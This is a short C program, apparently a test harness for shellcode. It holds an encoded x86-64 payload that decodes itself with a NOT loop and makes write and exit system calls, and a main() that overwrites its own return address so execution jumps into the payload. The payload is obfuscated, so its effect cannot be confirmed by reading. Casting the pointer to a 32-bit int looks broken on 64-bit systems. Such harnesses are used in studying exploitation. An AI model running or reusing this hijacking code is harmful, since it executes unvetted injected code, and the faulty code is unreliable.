char shellcode[] =
	"\xeb\x4d\x5e\x66\x83\xec\x0c\x48\x89\xe0\x48\x31\xc9\x68\x22\x3b\x62\x69\x48\x89\xcf\x80\xc1\x0c\x40\x8a\x3e\x40\xf6\xd7\x40\x88\x38\x48\xff\xc6\x68\x8f\x23\xde\x89\x48\xff\xc0\xe2\xea\x2c\x0c\x48\x89\xc6\x68\x9f\x2f\xfa\x5a\x48\x31\xc0\x48\x89\xc7\x04\x01\x48\x89\xc2\x80\xc2\x0b\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xae\xff\xff\xff\x87\xa8\x93\x94\xcf\x8b\x86\xce\x8d\x91\xbc\x99\xbc\xa1\x89\x71\xc9\x8a\x8e\x87\x7d\x4e\x96\x3a\xfa\x89\xa6\xe2\x68\x84\x38\xd8\x81\x5b\x52\x41\x4e\x44\x53\x54\x52\x32\x5d";
 
int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;  
	(*ret) = (int)shellcode;
}